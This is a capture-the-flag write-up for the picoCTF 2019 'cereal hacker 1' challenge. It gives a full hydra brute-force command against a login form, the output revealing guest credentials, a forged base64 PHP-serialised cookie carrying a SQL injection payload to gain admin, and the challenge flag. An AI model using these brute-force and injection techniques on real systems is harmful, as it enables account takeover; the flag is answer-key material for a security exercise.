# cereal hacker 1
To start, we actualy need to use brute force. Use [these](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt) [lists](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) to guide you.

First download the word lists. Then we can use the [hydra tool](https://github.com/vanhauser-thc/thc-hydra) to try to guess the password.

The command is ```hydra -L top-usernames-shortlist.txt -P 10-million-password-list-top-10000.txt -v http-post-form://2019shell1.picoctf.com:49879/"index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login"```

- `hydra`: use the [hydra password guesser](https://github.com/vanhauser-thc/thc-hydra)
- `-L top-usernames-shortlist.txt`: get usernames from [`top-usernames-shortlist.txt`](ttps://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt)
- `-P 10-million-password-list-top-10000.txt`: get passwords from [`10-million-password-list-top-10000.txt`](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt)
- `-v`: verbose output
- `http-post-form`: were guessing over http, specifily post on a form
- `2019shell1.picoctf.com:49879` guess to port 49879 on 2019shell1.picoctf.com
- `"index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login"`: guess to `index.php?file=login` with user and password from the wordlist, and output when you _don't_ see "Invalid Login"

This takes about 1/2 an hour to give
```text
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-03-08 11:20:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 170000 login tries (l:17/p:10000), ~10625 tries per task
[DATA] attacking http-post-form://2019shell1.picoctf.com:49879/index.php?file=login:user=^USER^&pass=^PASS^:Invalid Login
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[STATUS] 1361.00 tries/min, 1361 tries in 00:01h, 168639 to do in 02:04h, 16 active
[STATUS] 1371.67 tries/min, 4115 tries in 00:03h, 165885 to do in 02:01h, 16 active
[STATUS] 1366.29 tries/min, 9564 tries in 00:07h, 160436 to do in 01:58h, 16 active
[STATUS] 1364.60 tries/min, 20469 tries in 00:15h, 149531 to do in 01:50h, 16 active
[VERBOSE] Page redirected to http://2019shell1.picoctf.com:49879/index.php?file=login
[VERBOSE] Page redirected to http://2019shell1.picoctf.com:49879/index.php?file=regular_user
[49879][http-post-form] host: 2019shell1.picoctf.com   login: guest   password: guest
^C[ERROR] Received signal 2, going down ...
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

I'm not sure if this was intended. In the competition I got these details as someone put them in the discord, and the admins seemed to be fine with it.

Anyway now we can log in as `guest` with password `guest`. This gives us a cookie `user_info` with contents `TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiZ3Vlc3QiO3M6ODoicGFzc3dvcmQiO3M6NToiZ3Vlc3QiO30%253D`. Decoding with `base64` we get `O:11:"permissions":2:{s:8:"username";s:5:"guest";s:8:"password";s:5:"guest";}`. 

This seems like some strange php serialisation format. Anyway we want admin, so let's try a sql injection.

```
O:11:"permissions":2:{s:8:"username";s:5:"admin";s:8:"password";s:9:"'or'1'='1";}
```

Note we have to change the lenght on the password.

Now we encode this back up with base64 to get `TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO3M6NToiYWRtaW4iO3M6ODoicGFz c3dvcmQiO3M6OToiJ29yJzEnPScxIjt9Cg==`.

Put this in as our cookie and after navigating to [`index.php?file=admin`](https://2019shell1.picoctf.com/problem/12279/index.php?file=admin) we get the flag.

Flag: `picoCTF{3fba6964d680deb73b38b7f2916df7d5}`